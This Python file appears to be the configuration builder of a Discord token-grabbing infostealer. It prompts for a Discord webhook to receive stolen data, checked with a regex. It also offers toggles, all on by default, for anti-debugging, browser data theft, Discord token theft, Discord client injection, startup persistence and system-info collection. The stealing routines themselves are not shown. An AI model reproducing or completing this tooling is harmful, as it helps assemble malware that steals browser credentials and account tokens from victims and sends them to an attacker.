import re

from InquirerPy import prompt  # type: ignore


class Config:
    """
    The Config class creates the questions that will be prompted to the user
    and return the configuration data
    """

    def __init__(self) -> None:
        self.questions = [
            {
                "type": "input",
                "name": "webhook",
                "message": "Webhook",
                "validate": (lambda x: False if re.match(r"https://(canary.|ptb.)?(discord.com|discordapp.com)/api/webhooks/\d+/\S+", x) is None else True)
            },
            {
                "type": "confirm",
                "name": "antidebug",
                "message": "anti-debugging",
                "default": True,
            },
            {
                "type": "confirm",
                "name": "browsers",
                "message": "browser stealing",
                "default": True,
            },
            {
                "type": "confirm",
                "name": "discordtoken",
                "message": "Discord token stealing",
                "default": True,
            },
            {
                "type": "confirm",
                "name": "injection",
                "message": "Discord injection",
                "default": True,
            },
            {
                "type": "confirm",
                "name": "startup",
                "message": "startup",
                "default": True,
            },
            {
                "type": "confirm",
                "name": "systeminfo",
                "message": "system info",
                "default": True,
            },
        ]

    def get_config(self) -> dict:
        """
        Prompt the user with the questions and return the config data
        """
        return prompt(
            questions=self.questions,
            style={
                "questionmark": "#ff9d00 bold",
                "selected": "#5f819d",
                "instruction": "",  # default
                "answer": "#5f819d bold",
                "question": "",
            },
        )
